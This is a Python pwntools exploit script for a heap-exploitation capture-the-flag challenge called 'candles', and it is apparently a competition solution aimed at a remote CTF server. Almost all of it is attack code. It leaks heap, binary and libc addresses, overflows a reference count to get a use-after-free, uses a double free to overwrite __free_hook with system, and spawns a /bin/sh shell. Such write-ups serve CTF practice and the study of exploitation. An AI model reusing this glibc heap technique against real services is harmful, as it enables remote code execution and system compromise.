from pwn import *
context.arch="amd64"

elf = ELF("./candles",False)
libc = ELF("./libc-2.27.so",False)

if 'rem' in sys.argv:
    r = remote("leakguard.hackthe.vote", 1734)
else:
    if '-d' in sys.argv:
        os.system("docker exec candles pkill -9 candles")
        os.system("docker exec candles pkill -9 gdb")
    r = remote("0", 1734)
    if '-d' in sys.argv:
        os.system("docker exec candles pidof candles > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        c
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("docker cp /tmp/script.gdb candles:/tmp/script.gdb")
        run_in_new_terminal("docker exec -it candles gdb -q /candles %d -x /tmp/script.gdb"%pid)
        pid = pidof("candles")[0]
        proc.wait_for_debugger(pid)

menu = "Choice: "
def make_wax(frag, dye):
    r.sendafter(menu, "1\0")
    r.sendafter(menu, "%d\0"%frag)
    r.sendafter(menu, "%d\0"%dye)
def dump_wax(idx):
    r.sendafter(menu, "2\0")
    r.sendafter(menu, "%d\0"%idx)
def pour_candle(idx, name):
    r.sendafter(menu, "3\0")
    r.sendafter(menu, "%d\0"%idx)
    r.sendafter(":\n", name)
def list_candles():
    r.sendafter(menu, "4\0")
def sell_candle(idx):
    r.sendafter(menu, "5\0")
    r.sendafter(menu, "%d\0"%idx)

make_wax(0, 0)
make_wax(0, 0)

pour_candle(0, "c0")
pour_candle(0, "c1")
sell_candle(0)
sell_candle(1)

pour_candle(0, "\x01\x01")
list_candles()
r.recvuntil("0: ")
heap = u64(r.recvuntil("\n1: ", drop=True).ljust(8,'\0'))-0x101
sell_candle(0)
print "partial: "+hex(heap)
if heap < 0:
    raise Exception("bad heap base...")

# binary search 2nd byte of heap base
lo = 1
hi = 0xf
while lo != hi:
    print "%d %d"%(lo, hi)
    mid = (lo+hi)/2
    if lo+1 == hi and mid == lo:
        mid = hi
    pour_candle(0, "A"+p8(mid*0x10))
    list_candles()
    r.recvuntil("0: ")
    leak = r.recvuntil("\n1: ", drop=True)
    sell_candle(0)
    r.recvuntil("sold\n")
    if set(leak) == set('\0'):
        hi = mid-1
    else:
        lo = mid
heap += (lo+1)*0x1000
print "HEAP: "+hex(heap)

# overflow refcnt
pl = ""
for i in xrange(255):
    #pour_candle(0, "A"*16)
    pl += "3".ljust(0x1f,'\0')
    pl += "0".ljust(0x1f,'\0')
    pl += "A"*16
    #sell_candle(0)
    pl += "5".ljust(0x1f,'\0')
    pl += "0".ljust(0x1f,'\0')
r.send(pl)
for i in xrange(255):
    r.recvuntil("sold\n")
pour_candle(0, "pwn\0")
# waxes[0] is freed
sell_candle(0)

pour_candle(1, "pad\0")

# reclaim wax, get leaks
pl = flat(1, heap+0x290+1)
pour_candle(1, pl)
r.sendafter(menu, "3\0")
r.recvuntil("0:\n")
elf.address = u64(r.recvuntil("\n\x03\n", drop=True).ljust(8,'\0'))*0x100-(elf.search("Agave\0").next()&~0xff)
print "TEXT: "+hex(elf.address)
r.sendafter(menu, "2\0")

sell_candle(1)

pl = flat(1, elf.got['puts']+1)
pour_candle(1, pl)
r.sendafter(menu, "3\0")
r.recvuntil("0:\n")
libc.address = u64(r.recvuntil("\n\x03\n", drop=True).ljust(8,'\0'))*0x100-(libc.symbols['puts']&~0xff)
print "LIBC: "+hex(libc.address)
r.sendafter(menu, "2\0")

# double free
dump_wax(0)
sell_candle(1)

pour_candle(1, p64(libc.symbols['__free_hook']-1))
pour_candle(1, "/bin/sh\0")
pour_candle(1, "\0"+p64(libc.symbols['system']))
sell_candle(1)

r.interactive()
